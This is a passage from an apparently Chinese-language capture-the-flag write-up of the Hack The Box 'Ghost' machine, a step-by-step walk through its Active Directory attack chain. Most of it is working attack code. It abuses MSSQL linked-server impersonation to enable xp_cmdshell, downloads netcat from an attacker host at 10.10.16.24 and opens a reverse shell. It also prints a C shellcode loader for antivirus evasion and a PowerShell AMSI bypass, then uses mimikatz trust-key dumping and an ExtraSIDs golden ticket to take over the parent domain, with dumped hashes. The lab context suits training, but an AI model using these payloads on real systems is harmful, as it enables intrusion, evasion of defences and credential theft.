class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;lazyschemavalidation&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;collation&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;nonsqlsub&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>再看下有哪些用户可以登录</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">select * from openquery(<span class="string">&quot;PRIMARY&quot;</span><span class="punctuation">,</span> &#x27;SELECT distinct b.name</span><br><span class="line">FROM sys.server_permissions a</span><br><span class="line">INNER JOIN sys.server_principals b</span><br><span class="line">ON a.grantor_principal_id = b.principal_id</span><br><span class="line">&#x27;)</span><br><span class="line">WHERE a.permission_name = IMPERSONATE</span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;recordsets&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">[</span></span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sa&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;recordset&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sa&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;output&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;rowsAffected&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="number">1</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>


<p>我直接执行</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> OPENQUERY(&quot;PRIMARY&quot;, <span class="string">&#x27;execute as login = &#x27;&#x27;sa&#x27;&#x27;;exec sp_configure &#x27;&#x27;show advanced options&#x27;&#x27;, 1; ;RECONFIGURE;EXEC sp_configure &#x27;&#x27;xp_cmdshell&#x27;&#x27;,1;RECONFIGURE; exec xp_cmdshell &#x27;&#x27;dir c:&#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>报错</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">RequestError: The metadata could not be determined because the statement &#x27;select name,</span><br><span class="line">			convert(int, minimum) as minimum,</span><br><span class="line">			convert(int, maximum) as maximum,</span><br><span class="line">			convert&#x27; in procedure &#x27;sp_configure&#x27; is not compatible with the statement &#x27;select duplicate_options = name</span><br><span class="line">		from sys.configurations</span><br><span class="line">		where lower(name collate Latin1_Genera&#x27; in procedure &#x27;sp_configure&#x27;.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>说是不兼容..换个执行方式</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXECUTE</span>(<span class="string">&#x27;EXECUTE AS LOGIN = &#x27;&#x27;sa&#x27;&#x27;; EXEC sp_configure &#x27;&#x27;show advanced options&#x27;&#x27;,1; reconfigure;EXEC sp_configure &#x27;&#x27;xp_cmdshell&#x27;&#x27;,1;reconfigure;EXEC xp_cmdshell &#x27;&#x27;curl 10.10.16.24&#x27;&#x27;&#x27;</span>) <span class="keyword">AT</span> &quot;PRIMARY&quot;</span><br></pre></td></tr></table></figure>

<p>有反应，执行ok</p>
<p>传个nc进去弹shell</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXECUTE</span>(<span class="string">&#x27;EXECUTE AS LOGIN = &#x27;&#x27;sa&#x27;&#x27;; EXEC sp_configure &#x27;&#x27;xp_cmdshell&#x27;&#x27;,1;reconfigure;EXEC xp_cmdshell &#x27;&#x27;powershell.exe -c mkdir c:/test&#x27;&#x27;&#x27;</span>) <span class="keyword">AT</span> &quot;PRIMARY&quot;</span><br><span class="line"></span><br><span class="line"><span class="keyword">EXECUTE</span>(<span class="string">&#x27;EXECUTE AS LOGIN = &#x27;&#x27;sa&#x27;&#x27;; EXEC sp_configure &#x27;&#x27;xp_cmdshell&#x27;&#x27;,1;reconfigure;EXEC xp_cmdshell &#x27;&#x27;powershell.exe -c curl 10.10.16.24/nc64.exe -o c:/test/nc64.exe&#x27;&#x27;&#x27;</span>) <span class="keyword">AT</span> &quot;PRIMARY&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXECUTE</span>(<span class="string">&#x27;EXECUTE AS LOGIN = &#x27;&#x27;sa&#x27;&#x27;; EXEC sp_configure &#x27;&#x27;xp_cmdshell&#x27;&#x27;,1;reconfigure;EXEC xp_cmdshell &#x27;&#x27;c:\test\nc64.exe 10.10.16.24 10086 -e powershell&#x27;&#x27;&#x27;</span>) <span class="keyword">AT</span> &quot;PRIMARY&quot;</span><br></pre></td></tr></table></figure>

<p>进来之后发现是mssql用户</p>
<p>收集信息时候ipconfig看到当前主机是在corp.ghost.htb，这特么拿了这台还没结束。</p>
<p>priv有<code>SeImpersonatePrivilege</code>，可以考虑godpotato和efspotato，系统里有杀软，这里同事安利我用的efspotato.cs然后用里面的.net编译，可以绕过，我试了下做免杀绕过也是ok。</p>
<p>免杀我用分离的，朋友安利的shellcode生成项目<code>donut-maker</code>丢到bin文件，再写个基础的加载器就行，虽然可以过，但写的有些丑陋s，欢迎师傅们给出建议</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    HANDLE hFile = CreateFileA(<span class="string">&quot;tt.ico&quot;</span>, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    DWORD fileSize = GetFileSize(hFile, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (fileSize == INVALID_FILE_SIZE || fileSize == <span class="number">0</span>) &#123;</span><br><span class="line">        CloseHandle(hFile);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    LPVOID shellcode = VirtualAlloc(<span class="literal">NULL</span>, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (!shellcode) &#123;</span><br><span class="line">        CloseHandle(hFile);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    DWORD bytesRead;</span><br><span class="line">    <span class="keyword">if</span> (!ReadFile(hFile, shellcode, fileSize, &amp;bytesRead, <span class="literal">NULL</span>) || bytesRead != fileSize) &#123;</span><br><span class="line">        VirtualFree(shellcode, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">        CloseHandle(hFile);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    CloseHandle(hFile);</span><br><span class="line"></span><br><span class="line">    ((<span class="type">void</span>(*)())shellcode)();</span><br><span class="line"></span><br><span class="line">    VirtualFree(shellcode, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>选一个提权方式即可。</p>
<p>拿到system，先把这个b amsi给他杀了</p>
<p>这里方式比较多，我用的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a=[Ref].Assembly.GetTypes();Foreach($b in $a) &#123;if ($b.Name -like &quot;*iUtils&quot;) &#123;$c=$b&#125;&#125;;$d=$c.GetFields(&#x27;NonPublic,Static&#x27;);Foreach($e in $d) &#123;if ($e.Name -like &quot;*iContext&quot;) &#123;$f=$e&#125;&#125;;$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)</span><br></pre></td></tr></table></figure>

<p>很奇怪我打的时候可以关掉，写wp的时候杀不掉了，不知道为啥，也可能打的时候机器上的amsi被其他人关了..,多找几个项目肯定是能关的掉。</p>
<p>这里考虑到是在另一个子域里所以先看下关系</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\users\administrator\downloads&gt; nltest /domain_trusts</span><br><span class="line">nltest /domain_trusts</span><br><span class="line">List of domain trusts:</span><br><span class="line">    <span class="number">0</span>: GHOST ghost.htb (NT <span class="number">5</span>) (Forest Tree Root) (Direct Outbound) (Direct Inbound) ( Attr: withinforest )</span><br><span class="line">    <span class="number">1</span>: GHOST<span class="literal">-CORP</span> corp.ghost.htb (NT <span class="number">5</span>) (Forest: <span class="number">0</span>) (Primary Domain) (Native)</span><br></pre></td></tr></table></figure>

<p>好吧还是要移动到根域</p>
<p>传个mimikatz，这东西我太久不用有些生疏</p>
<p>可以参考</p>
<p><a target="_blank" rel="noopener" href="https://fortynorthsecurity.com/blog/golden-tickets-and-external-sids-spread-the-compromise/">https://fortynorthsecurity.com/blog/golden-tickets-and-external-sids-spread-the-compromise/</a></p>
<p>比较详细的可以看</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zpchcbd/p/12215646.html">https://www.cnblogs.com/zpchcbd/p/12215646.html</a></p>
<p>其中没法直接单纯用sid制作golden的主要原因也有讲，所以我们可以尝试伪造企业管理员的sids攻击。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这里不知道大家有没有想过为什么mimikatz生成的黄金票据无法进行跨域利用？</span><br><span class="line"></span><br><span class="line">原因在mimikatz通过/sid选项接收SID号然后在尾部拼接RID号（512,519等），拼接之后生成的Enterprise Admins组的完整SID是S-1-5-21-237381039-3464644732-246105634-519，根据上面的知识是可以知道这个SID在整个域林中都是不存在的（原因是子域没有Enterprise Admins组），所以在子域中通过mimikatz生成的金票无法跨域或者是访问其他域的资源。</span><br></pre></td></tr></table></figure>

<p>子域向主域在互信的情况下移动还是比较好理解的，这里选用sid伪造企业管理工作组</p>
<p>先获取当前域的sid 狗里没有所以手动获取一下</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\users\administrator\downloads&gt; <span class="built_in">Get-DomainSID</span></span><br><span class="line"><span class="built_in">Get-DomainSID</span></span><br><span class="line">S<span class="literal">-1-5-21-2034262909-2733679486-179904498</span></span><br></pre></td></tr></table></figure>

<p><code>lsadump::trust /patch</code>拿一下可信密钥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">PS C:\test&gt; .\mimikatz.exe &quot;lsadump::trust /patch&quot; &quot;exit&quot;             </span><br><span class="line">.\mimikatz.exe &quot;lsadump::trust /patch&quot; &quot;exit&quot;</span><br><span class="line"></span><br><span class="line">  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08</span><br><span class="line"> .## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span><br><span class="line"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br><span class="line"> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span><br><span class="line"> &#x27;## v ##&#x27;       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  &#x27;#####&#x27;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) # lsadump::trust /patch</span><br><span class="line"></span><br><span class="line">Current domain: CORP.GHOST.HTB (GHOST-CORP / S-1-5-21-2034262909-2733679486-179904498)</span><br><span class="line"></span><br><span class="line">Domain: GHOST.HTB (GHOST / S-1-5-21-4084500788-938703357-3654145966)</span><br><span class="line"> [  In ] CORP.GHOST.HTB -&gt; GHOST.HTB</span><br><span class="line">    * 7/20/2024 5:11:40 AM - CLEAR   - 80 1e 01 39 aa 1b 60 b3 5e 6c 10 c1 a3 1c 0d 40 4a 68 57 bc ba 73 81 03 e8 15 ed af 04 bf c7 43 c7 9a 67 1e b2 3c 22 a0 3d 75 d6 14 05 d7 70 8a 93 bf e6 88 2b cc 9b 63 ed 23 88 fc 2f ec b8 a9 b4 8e f1 35 92 d9 40 74 0e 8e 78 46 e3 34 34 79 fb cb da 7b 51 9c a9 cb 89 5e b8 11 b8 bf eb f2 8d 57 37 f1 b0 05 05 62 61 70 a2 05 4a fb e5 f3 37 14 b2 41 69 22 5f 4b c4 56 af 69 a1 7e 14 24 22 f4 93 10 7d 16 85 9d 75 88 aa ac 6b 20 0f 7a 32 5e 11 88 dd 00 b0 e5 2f 42 73 8b 1a b1 1c 44 b1 4c e4 63 c9 2e 33 48 af f5 07 d6 b5 c6 24 db ca d1 3e 09 1c a6 d8 75 35 33 d8 1a d5 80 7b 65 6f 2f 70 94 53 9b cc 10 5f 39 78 c3 41 b2 83 c5 26 10 7d 0a 3f 0f a4 5b d1 f6 4f 76 ae e2 02 29 f5 20 7a d9 75 af 82 6c 0c 0b 77 f0 a3 13 55 c0 </span><br><span class="line">        * aes256_hmac       30b8a74604fa558f0bee190055d854df610ef6d37289d60d9cf0af23be25c12b</span><br><span class="line">        * aes128_hmac       bbbf82a51b08b5db2ad6b3ae78c19c64</span><br><span class="line">        * rc4_hmac_nt       aa7224df1e0dfd4cd9d61694880cfdb1</span><br></pre></td></tr></table></figure>

<p><code>aa7224df1e0dfd4cd9d61694880cfdb1</code>就是</p>
<p>再去狗里看下主域的企业管理员sid<br><code>Object ID	S-1-5-21-4084500788-938703357-3654145966-519</code></p>
<p>申请黄金票据即可，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.\mimikatz.exe &quot;kerberos::golden /user:Administrator /rc4:1c58f82747679ec18596d3685767d28c /domain:corp.ghost.htb /sid:S-1-5-21-2034262909-2</span><br><span class="line">733679486-179904498 /sids:S-1-5-21-4084500788-938703357-3654145966-519 /target:ghost.htb /ticket:test.kirbi&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>


<p>申请cifs的st <code>.\Rubeus.exe asktgs /service:cifs/DC01.ghost.htb /domain:ghost.htb /dc:DC01.GHOST.HTB /ticket:test.kirbi /ptt /nowrap</code></p>
<p>访问smb路径即可</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$MACHINE</span>.ACC:plain_password_hex:7fc866113c4bdd49ff5c5f7ff34197545f3a9f10af4ca12a28b97d13bbfa34d3e450191065071e3477c2690aafb0bae97bf380d25632</span><br><span class="line">478a878d35c92fe318e518b4aef1d8ad3d951fce7c564fdac433050eff0f986359a98fffc0a4e6b4f501835969825fd10a45e1d8bef203ec5ee906ed6e52d01b65061cbc7774</span><br><span class="line">e58eda14531bbcdef7bbe1a88e42ef48df4ce44e124c9db01625018b86660f7c9bbb34a8e24640ba7f4c59c8594f95bd9f43bdc7d1d5de1036f46c20aeeb9d2c5c87c92ef518</span><br><span class="line">2b5b55e59ddb25c3bff0b88545d3259c4c6ea03db9159f27ad</span><br></pre></td></tr></table></figure>
        
      </div>
      
         
    </div>
    
     
  </div>
  
    
<nav id="article-nav">
  <a class="article-nav-btn left "
    
      href="/2024/07/21/box-GreenHorn-wp/"
      title="【season-5】box GreenHorn wp"
     >
    <i class="fa-solid fa-angle-left"></i>
    <p class="title-text">
      
        【season-5】box GreenHorn wp
        
    </p>
  </a>
  <a class="article-nav-btn right "
    
      href="/2024/06/25/maldev/"
      title="maldev"
     >

    <p class="title-text">
      
        maldev
        
    </p>
    <i class="fa-solid fa-angle-right"></i>
  </a>
</nav>


  
</article>






    </div>
    <div id="footer-wrapper">
      <footer id="footer">
  
  <div id="footer-info" class="inner">
    
    &copy; 2025 Flower<br>
    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
  </div>
</footer>


    </div>
    <div class="back-to-top-wrapper">
    <button id="back-to-top-btn" class="back-to-top-btn hide" onclick="topFunction()">
        <i class="fa-solid fa-angle-up"></i>
    </button>
</div>

<script>
    function topFunction() {
        window.scroll({ top: 0, behavior: 'smooth' });
    }
    let btn = document.getElementById('back-to-top-btn');
    function scrollFunction() {
        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
            btn.classList.remove('hide')
        } else {
            btn.classList.add('hide')
        }
    }
    window.onscroll = function() {
        scrollFunction();
    }
</script>

  </div>
  <script src="/js/light-dark-switch.js"></script>
</body>
</html>


